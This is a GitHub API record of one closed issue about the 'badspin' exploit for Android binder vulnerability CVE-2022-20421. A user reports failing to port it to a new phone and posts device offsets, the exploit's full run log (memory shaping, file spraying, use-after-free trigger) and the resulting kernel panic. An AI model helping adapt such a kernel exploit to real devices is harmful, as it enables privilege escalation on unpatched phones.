{"total_count": 11, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/0xkol/badspin/issues/12", "repository_url": "https://api.github.com/repos/0xkol/badspin", "labels_url": "https://api.github.com/repos/0xkol/badspin/issues/12/labels{/name}", "comments_url": "https://api.github.com/repos/0xkol/badspin/issues/12/comments", "events_url": "https://api.github.com/repos/0xkol/badspin/issues/12/events", "html_url": "https://github.com/0xkol/badspin/issues/12", "id": 1956224041, "node_id": "I_kwDOJNRCIs50mZwp", "number": 12, "title": "Failed to adapt the exploit in a new device", "user": {"login": "Securee", "id": 79675350, "node_id": "MDQ6VXNlcjc5Njc1MzUw", "avatar_url": "https://avatars.githubusercontent.com/u/79675350?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Securee", "html_url": "https://github.com/Securee", "followers_url": "https://api.github.com/users/Securee/followers", "following_url": "https://api.github.com/users/Securee/following{/other_user}", "gists_url": "https://api.github.com/users/Securee/gists{/gist_id}", "starred_url": "https://api.github.com/users/Securee/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Securee/subscriptions", "organizations_url": "https://api.github.com/users/Securee/orgs", "repos_url": "https://api.github.com/users/Securee/repos", "events_url": "https://api.github.com/users/Securee/events{/privacy}", "received_events_url": "https://api.github.com/users/Securee/received_events", "type": "User", "user_view_type": "public", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 13, "created_at": "2023-10-23T02:19:17Z", "updated_at": "2024-03-30T20:34:30Z", "closed_at": "2023-11-02T06:15:49Z", "author_association": "NONE", "sub_issues_summary": {"total": 0, "completed": 0, "percent_completed": 0}, "active_lock_reason": null, "body": "I want to adapt the exploit and support a new device( not Samsung or Google pixel),\r\n        .android_version = 12,\r\n        .android_security_patch.year = 2022,\r\n        .android_security_patch.month = 3,\r\n        .kernel_version = KERNEL_VERSION(5, 4, 134),\r\n        .kimg_to_lm = pixel_kimg_to_lm,\r\n        .find_kbase = noop_kbase,\r\nThe uname -a is:\r\nLinux localhost 5.4.134-qgki-g27c154db7d6e #1 SMP PREEMPT Fri Mar 25 11:44:48 CST 2022 aarch64\r\n\r\nI have tried many times, but it failed with the following output and then the phone panic:\r\n==========================================\r\nBad Spin Exploit (CVE-2022-20421) by 0xkol\r\n==========================================\r\n[x] Looking for binder_proc's inner_lock offset\r\n[x] Trigger vulnerability... (mode = 1)\r\n[8265:8265] New binder client: A\r\n[8266:8266] New binder client: B\r\n[8267:8267] New binder client: C\r\nC: lookup A => handle = 2\r\nA: lookup B => handle = 2\r\nA: Waiting for strong nodes...\r\nB: Searching for magic badcab1ebadcab1e....\r\nA: 1 references accepted\r\nA: Sending 1 strong handles to B\r\nC: Wait for A...\r\nTxn size: 1023.562500KB\r\nB: Destroying\r\nB: Finish. \r\nmonitor_thread_a: Waiting for death notification\r\nmonitor_thread_a: Found dead binder (cookie = 0x5858585858585858)\r\nmonitor_thread_a: Done\r\nA: Done sending transaction. BR_FAILED_REPLY\r\npoc_a_wait_for_c_death: Waiting for C death notification\r\n[x] Trigger use-after-free\r\n\tTesting ptmx 0 (fd 4)\r\n\t\tReading ptmx 0\r\n\tTesting ptmx 1 (fd 5)\r\n\t\tReading ptmx 1\r\n\tFreeing ptmx...\r\npoc_a_wait_for_c_death: Found dead binder (cookie = 0x6161616161616161)\r\n[x] Finish spinning at spin_lock()\r\n\tJoining blocker threads...\r\n\tAll blocker threads joined.\r\noffsetof(inner_lock, binder_proc) = 576\r\n[x] Found binder_proc's inner_lock offset: 576 (vuln_fd 72)\r\n\r\n[graveyard_process] pid = 8320\r\n[pipe_process:8321] Pinned to CPU 0\r\n[pipe_process:8323] Pinned to CPU 2\r\n[pipe_process:8324] Pinned to CPU 3\r\n[pipe_process:8322] Pinned to CPU 1\r\n[pipe_process:8325] Pinned to CPU 4\r\n[pipe_process:8326] Pinned to CPU 5\r\n[pipe_process:8327] Pinned to CPU 6\r\n[pipe_process:8328] Pinned to CPU 7\r\n[fd_master_process] pid = 8329\r\n[fd_master_process] Creating dup process spawner\r\n[fd_master_process] Creating 50 dup processes\r\n[fd_master_process] Setup 8 pipe processes\r\n[x] Shaping physical memory\r\n[fd_master_process] Creating 5 shapers\r\n[fd_master_process] Waiting for shapers...\r\n[shaper_process:8383] 30000 files sprayed\r\n[shaper_process:8385] 30000 files sprayed\r\n[shaper_process:8384] 30000 files sprayed\r\n[shaper_process:8382] 30000 files sprayed\r\n[shaper_process:8381] 30000 files sprayed\r\n[fd_master_process] Shapers done.\r\n[fd_master_process] Wait for all dup processes to finish\r\n[x] Trigger vulnerability... (mode = 3)\r\n[timer_master_process] pid=8386\r\n[timer_master_process] Wait for C to enter spin_lock()\r\n[8387:8387] New binder client: A\r\n[8389:8389] New binder client: C\r\n[8388:8388] New binder client: B\r\nA: lookup B => handle = 2\r\nC: lookup A => handle = 2\r\nA: Waiting for strong nodes...\r\nB: Searching for magic badcab1ebadcab1e....\r\nA: 1 references accepted\r\nA: Sending 1 strong handles to B\r\nC: Wait for A...\r\nTxn size: 1023.562500KB\r\nB: Destroying\r\nB: Finish. \r\nmonitor_thread_a: Waiting for death notification\r\nmonitor_thread_a: Found dead binder (cookie = 0x5858585858585858)\r\nmonitor_thread_a: Done\r\nA: Done sending transaction. BR_FAILED_REPLY\r\npoc_a_wait_for_c_death: Waiting for C death notification\r\n[x] Trigger use-after-free\r\n[x] Waiting for timer threads\r\npoc_a_wait_for_c_death: Found dead binder (cookie = 0x6161616161616161)\r\n[x] Finish spinning at spin_lock()\r\n[timer_master_process] Done.\r\n.....................................!............\r\n[x] Failed.\r\n\r\n[cleanup_fd_master] Cleanup zombie processes\r\n\tCleanup dup processes\r\n\t\tDone.\r\n\tReset pipe processes\r\n\tCleanup shapers\r\n\t\tDone.\r\n\tCleanup spawner\r\n\tCleanup done.\r\n[fd_master_process] pid = 8417\r\n[fd_master_process] Creating dup process spawner\r\n[fd_master_process] Creating 50 dup processes\r\n[fd_master_process] Setup 8 pipe processes\r\n[x] Shaping physical memory\r\n[fd_master_process] Creating 5 shapers\r\n[fd_master_process] Waiting for shapers...\r\n[shaper_process:8473] 30000 files sprayed\r\n[shaper_process:8469] 30000 files sprayed\r\n[shaper_process:8470] 30000 files sprayed\r\n[shaper_process:8472] 30000 files sprayed\r\n[shaper_process:8471] 30000 files sprayed\r\n[fd_master_process] Shapers done.\r\n[fd_master_process] Wait for all dup processes to finish\r\n[x] Trigger vulnerability... (mode = 3)\r\n[timer_master_process] pid=8474\r\n[timer_master_process] Wait for C to enter spin_lock()\r\n[8476:8476] New binder client: B\r\n[8480:8480] New binder client: C\r\n[8475:8475] New binder client: A\r\nA: lookup B => handle = 2\r\nC: lookup A => handle = 2\r\nA: Waiting for strong nodes...\r\nA: 1 references accepted\r\nB: Searching for magic badcab1ebadcab1e....\r\nA: Sending 1 strong handles to B\r\nC: Wait for A...\r\nTxn size: 1023.562500KB\r\nB: Destroying\r\nB: Finish. \r\nmonitor_thread_a: Waiting for death notification\r\nmonitor_thread_a: Found dead binder (cookie = 0x5858585858585858)\r\nmonitor_thread_a: Done\r\nA: Done sending transaction. BR_FAILED_REPLY\r\npoc_a_wait_for_c_death: Waiting for C death notification\r\n[x] Trigger use-after-free\r\n[x] Waiting for timer threads\r\npoc_a_wait_for_c_death: Found dead binder (cookie = 0x6161616161616161)\r\n[x] Finish spinning at spin_lock()\r\n[timer_master_process] Done.\r\n.................................*................\r\n\r\nThe panic info is:\r\nmReason: PANIC\r\nsReason:page_request\r\ninfo: PC filp_close+0x28/0xbc\r\n\r\nAnd I have tried to change NR_EPFDS from 500 to 200, but it failed the same error.\r\nBTW, it seem to crash randomly.", "reactions": {"url": "https://api.github.com/repos/0xkol/badspin/issues/12/reactions", "total_count": 0, "+1": 0, "-1": 0, "laugh": 0, "hooray": 0, "confused": 0, "heart": 0, "rocket": 0, "eyes": 0}, "timeline_url": "https://api.github.com/repos/0xkol/badspin/issues/12/timeline", "performed_via_github_app": null, "state_reason": "completed", "score": 1.0}]}